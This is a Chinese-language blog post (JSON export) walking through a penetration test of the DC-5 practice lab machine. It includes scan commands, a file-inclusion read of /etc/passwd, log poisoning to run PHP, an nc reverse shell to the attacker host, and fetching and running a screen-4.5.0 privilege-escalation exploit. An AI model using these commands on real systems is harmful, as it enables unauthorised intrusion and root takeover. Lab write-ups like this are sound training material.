{"title":"DC-5靶机渗透","uid":"a5f05b43c45d522768da0aaf98592442","slug":"DC-5靶机渗透","date":"2023-02-07T02:19:39.442Z","updated":"2023-02-07T09:28:06.280Z","comments":true,"path":"api/articles/DC-5靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-exyyz8.jpg","content":"<h1 id=\"DC-5靶机渗透全流程\"><a href=\"#DC-5靶机渗透全流程\" class=\"headerlink\" title=\"DC-5靶机渗透全流程\"></a>DC-5靶机渗透全流程</h1><h2 id=\"一：实验环境\"><a href=\"#一：实验环境\" class=\"headerlink\" title=\"一：实验环境\"></a>一：实验环境</h2><p>kali攻击机：192.168.235.130</p>\n<p>dc-5：192.168.235.131</p>\n<h2 id=\"二：信息收集\"><a href=\"#二：信息收集\" class=\"headerlink\" title=\"二：信息收集\"></a>二：信息收集</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><p>因为是在内网环境，所以直接用arp-scan</p>\n<p><code>arp-scan -l</code></p>\n<p>可以发现目标靶机的ip地址<code>192.168.235.131</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207110826659.png\" alt=\"image-20230207110826659\"></p>\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><p>先用<code>masscan</code>对端口进行一个快速的扫描</p>\n<p><code>masscan --rate=10000 --ports 0-65535 192.168.235.131</code></p>\n<p>可以发现开启了<code>80，111，38732</code>端口</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207111302705.png\" alt=\"image-20230207111302705\"></p>\n<p>再用<code>nmap</code>对端口进行详细的扫描</p>\n<p><code>nmap -sV -p80,111,38732 -A  192.168.235.131 </code></p>\n<p>可以发现中间件用的nginx，服务器是Linux操作系统</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207111627426.png\" alt=\"image-20230207111627426\"></p>\n<h3 id=\"访问网页\"><a href=\"#访问网页\" class=\"headerlink\" title=\"访问网页\"></a>访问网页</h3><p>访问80端口的网页，目前没有收集到可用信息</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207111921147.png\" alt=\"image-20230207111921147\"></p>\n<h3 id=\"burp-suite抓包分析\"><a href=\"#burp-suite抓包分析\" class=\"headerlink\" title=\"burp suite抓包分析\"></a>burp suite抓包分析</h3><p>访问网页的contact栏，发现有可以交互的地方</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207112712559.png\" alt=\"image-20230207112712559\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207112729207.png\" alt=\"image-20230207112729207\"></p>\n<p>思考这个地方可能会产生注入点</p>\n<p>先抓个包看看</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207113240494.png\" alt=\"image-20230207113240494\"></p>\n<p>通过不停的send请求，发现版本信息在变化</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207113409199.png\" alt=\"image-20230207113409199\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207113422487.png\" alt=\"image-20230207113422487\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207113437098.png\" alt=\"image-20230207113437098\"></p>\n<p>浏览web页面，发现每次提交联系表单后，都会重定向到一个thankyou.php的页面</p>\n<p>且版本会随着改变</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207113613392.png\" alt=\"image-20230207113613392\"></p>\n<p>分析到这里，只发现了这个异常点，但是对渗透依然没有头绪，扫描一下目录看看</p>\n<h3 id=\"目录扫描\"><a href=\"#目录扫描\" class=\"headerlink\" title=\"目录扫描\"></a>目录扫描</h3><p><code>dirsearch -u http://192.168.235.131/ -e*</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207114053190.png\" alt=\"image-20230207114053190\"></p>\n<p>看到有一个之前没有访问过的页面<code>footer.php</code></p>\n<p>尝试访问一下</p>\n<p>发现就是版本信息的页面，而且随着刷新版本号还不同</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207114419042.png\" alt=\"image-20230207114419042\"></p>\n<p><strong>这里就可以想到，之前的thankyou.php页面是调用了现在这个footer.php来显示内容的</strong></p>\n<h2 id=\"三：渗透测试\"><a href=\"#三：渗透测试\" class=\"headerlink\" title=\"三：渗透测试\"></a>三：渗透测试</h2><h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>hankyou.php页面是调用了现在这个footer.php来显示内容</p>\n<p>形式应该为<code>192.168.235.131/thankyou.php?file=footer.php</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">这里得到参数名是file还有得出是通过get传参其实是没有什么根据的，只能说根据以往的经验姑且这么试一试，发现正好可以访问</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207115252316.png\" alt=\"image-20230207115252316\"></p>\n<h3 id=\"文件包含漏洞\"><a href=\"#文件包含漏洞\" class=\"headerlink\" title=\"文件包含漏洞\"></a>文件包含漏洞</h3><p>既然发现了文件包含，自然就想到有文件包含漏洞了</p>\n<p>用wfuzz爆破一下路径看看</p>\n<p><code>wfuzz -w /usr/share/wordlists/wfuzz/general/test.txt  -w /usr/share/wordlists/wfuzz/general/lujing.txt http://192.168.235.131/thankyou.php?FUZZ=FUZZ</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>wfuzz的使用</p>\n<p><a href=\"https://www.freebuf.com/column/163632.html\">https://www.freebuf.com/column/163632.html</a></p>\n<p><a href=\"https://blog.csdn.net/JBlock/article/details/88619117\">https://blog.csdn.net/JBlock/article/details/88619117</a></p>\n<p><a href=\"https://www.ddosi.org/wfuzz-guide/\">https://www.ddosi.org/wfuzz-guide/</a></p></blockquote>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207152823765.png\" alt=\"image-20230207152823765\"></p>\n<p>尝试访问下<code>http://192.168.235.131/thankyou.php?file=/etc/passwd</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207152911262.png\" alt=\"image-20230207152911262\"></p>\n<p>证明有文件包含漏洞了</p>\n<h3 id=\"尝试通过日志文件来拿shell\"><a href=\"#尝试通过日志文件来拿shell\" class=\"headerlink\" title=\"尝试通过日志文件来拿shell\"></a>尝试通过日志文件来拿shell</h3><p>通过日志文件查看访问网站的请求</p>\n<p><code>http://192.168.235.131/thankyou.php?file=/var/log/nginx/access.log</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207154725967.png\" alt=\"image-20230207154725967\"></p>\n<p>我们可以利用这个特点写入一段代码程序，传递到web服务器，这样这段代码程序会被写入到日志文件中</p>\n<p>然后我们可以利用文件包含漏洞读取网站的日志文件去执行这段代码</p>\n<p>用burp suite写入恶意代码</p>\n<p>先上传一句phpinfo，看是否可以执行</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207160449681.png\" alt=\"image-20230207160449681\"></p>\n<p>执行成功，同理就可以执行其他php代码</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207164132677.png\" alt=\"image-20230207164132677\"></p>\n<p>蚁剑连接</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207164241035.png\" alt=\"image-20230207164241035\"></p>\n<p>蚁剑上打开虚拟终端，然后反弹shell</p>\n<p>kali上开启监听<code>nc -lvvp 4444</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207165428631.png\" alt=\"image-20230207165428631\"></p>\n<p>蚁剑终端输入<code>nc 192.168.235.130 4444 -e /bin/bash </code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207165436305.png\" alt=\"image-20230207165436305\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>获取交互式shell</p>\n<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>\n<p>查找具有SUID 标志的命令</p>\n<p><code>find / -perm -4000 2&gt;/dev/null</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207165825045.png\" alt=\"image-20230207165825045\"></p>\n<p>搜索一下<code>screen-4.5.0</code>这个一看就很特殊的文件</p>\n<p>看到有可利用的脚本</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207170045898.png\" alt=\"image-20230207170045898\"></p>\n<p>先进入脚本的目录，把脚本复制到桌面，然后在桌面开启kali的http服务，把这个脚本下载到靶机</p>\n<p><code>cp /usr/share/exploitdb/exploits/linux/local/41154.sh /root/Desktop</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207170718640.png\" alt=\"image-20230207170718640\"></p>\n<p>kali 在当前目录下开启http 服务</p>\n<p><code>python3 -m http.server 2222</code></p>\n<p>在靶机中下载脚本，在靶机的tmp目录下下载，因为&#x2F;tmp目录的权限大</p>\n<p><code>wget http://192.168.235.130:2222/41154.sh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207171223852.png\" alt=\"image-20230207171223852\"></p>\n<p>给执行权限</p>\n<p><code>chmod 777 41154.sh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207171339636.png\" alt=\"image-20230207171339636\"></p>\n<p>尝试执行，执行成功</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207171444207.png\" alt=\"image-20230207171444207\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207171749795.png\" alt=\"image-20230207171749795\"></p>\n<p>查看flag</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230207171720758.png\" alt=\"image-20230207171720758\"></p>\n","text":"DC-5靶机渗透全流程一：实验环境kali攻击机：192.168.235.130 dc-5：192.168.235.131 二：信息收集主机发现因为是在内网环境，所以直接用arp-scan arp-scan -l 可以发现目标靶机的ip地址192.168.235.131 端口扫描...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":11,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":8,"path":"api/tags/DC系列靶机.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#DC-5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%85%A8%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">DC-5靶机渗透全流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%EF%BC%9A%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">一：实验环境</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">二：信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">主机发现</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">端口扫描</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5\"><span class=\"toc-text\">访问网页</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#burp-suite%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90\"><span class=\"toc-text\">burp suite抓包分析</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">目录扫描</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">三：渗透测试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">文件包含漏洞</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B0%9D%E8%AF%95%E9%80%9A%E8%BF%87%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%9D%A5%E6%8B%BFshell\"><span class=\"toc-text\">尝试通过日志文件来拿shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">提权</span></a></li></ol></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"php反序列化漏洞学习","uid":"27a8c82d6074b44b0feedf4a65c9f85a","slug":"php反序列化漏洞学习","date":"2023-02-11T02:27:57.686Z","updated":"2023-02-13T12:41:05.845Z","comments":true,"path":"api/articles/php反序列化漏洞学习.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-2y85z9.png","text":"前言php反序列化漏洞一直是自己的一个弱项，想到上次ctf比赛就是因为web的最后一道题是php反序列化没有思路导致成绩不太理想，特此做个学习笔记以便自己以后查阅 php面向对象基本概念面向对象首先要明确面向对象程序开发的概念 面向过程： 面向过程是一种以“整体事件” 为中心的编...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"14 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":11,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":5,"path":"api/tags/php.json"},{"name":"漏洞","slug":"漏洞","count":5,"path":"api/tags/漏洞.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"PHP编程与开发","uid":"20917cafe9bad9b66ec14a8de4e80fe8","slug":"PHP编程与开发","date":"2023-02-01T02:09:04.026Z","updated":"2023-02-01T02:08:35.170Z","comments":true,"path":"api/articles/PHP编程与开发.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-vq9kjl.png","text":"PHP基本使用PHP基础PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言 PHP 是什么？ PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。 PHP 脚本在服务器上执行。 PHP 可免费下载使用。...","link":"","photos":[],"count_time":{"symbolsCount":"28k","symbolsTime":"26 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":11,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":5,"path":"api/tags/php.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}